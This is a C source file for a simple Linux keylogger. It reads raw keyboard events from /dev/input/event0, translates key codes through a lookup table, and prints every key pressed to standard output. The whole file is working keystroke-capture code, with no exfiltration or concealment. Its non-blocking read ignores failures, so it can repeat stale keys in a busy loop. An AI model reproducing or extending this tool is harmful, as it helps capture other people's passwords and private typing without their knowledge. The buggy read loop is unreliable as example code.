#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>

/* Get into debug mode */
#define DEBUG

/* Use a macro for logging */
#ifdef DEBUG
#define log_info(logger_input)\
    printf("%s", logger_input)
#define log_err(logger_input)\
    fprintf(stderr, "%s", logger_input)
#else
#define log_info(logger_input)
#define log_err(logger_input)
#endif

/* Define error codes */
#define ERR_FILE 5


/* The event to be recorded
 * In this case, it's the keyboard */
#define EVENT_FILE_PATH "/dev/input/event0"


/* Return the key according to the keycodes in the Linux Manual */
char key_table[248] = {
    '\0',   /* reserved */
    '\0',   /* escape */
    '1',
    '2',
    '3',
    '4',
    '5',
    '6',
    '7',
    '8',
    '9',
    '0',
    '-',
    '=',
    '\0',   /* backspace */
    '\t',   /* tab */
    'q',
    'w',
    'e',
    'r',
    't',
    'y',
    'u',
    'i',
    'o',
    'p',
    '[',
    ']',
    '\n',   /* enter */
    '\0',   /* left ctrl */
    'a',
    's',
    'd',
    'f',
    'g',
    'h',
    'j',
    'k',
    'l',
    ';',
    '\'',
    '\0',   /* grave */
    '\0',   /* left shift */
    '\\',   /* left backslash */
    'z',
    'x',
    'c',
    'v',
    'b',
    'n',
    'm',
    ',',
    '.',
    '/',
    '\0',   /* right shift */
    '*',    /* asterisk */
    '\0',   /* left alt */
    ' ',    /* space */
    '\0',   /* caps lock */
    '\0'    /* F1 */
};


int main(int argc, char *argv[])
{
    int event_fd;
    char key;
    struct input_event buffer;

    /* open event file */
    event_fd = open(EVENT_FILE_PATH, O_RDONLY | O_NONBLOCK);
    if (event_fd == -1) {
        log_err("Could not open event file\n");
        exit(ERR_FILE);
    }
    log_info("File opened\n");

    /* keep reading the event file for changes */
    while (1) {
        read(event_fd, &buffer, sizeof(struct input_event));

        /* log key on keydown */
        if (buffer.type == EV_KEY && buffer.value == 1) {
            fflush(stdout);
            printf("%c", key_table[buffer.code]);
        }
    }

    return 0;
}
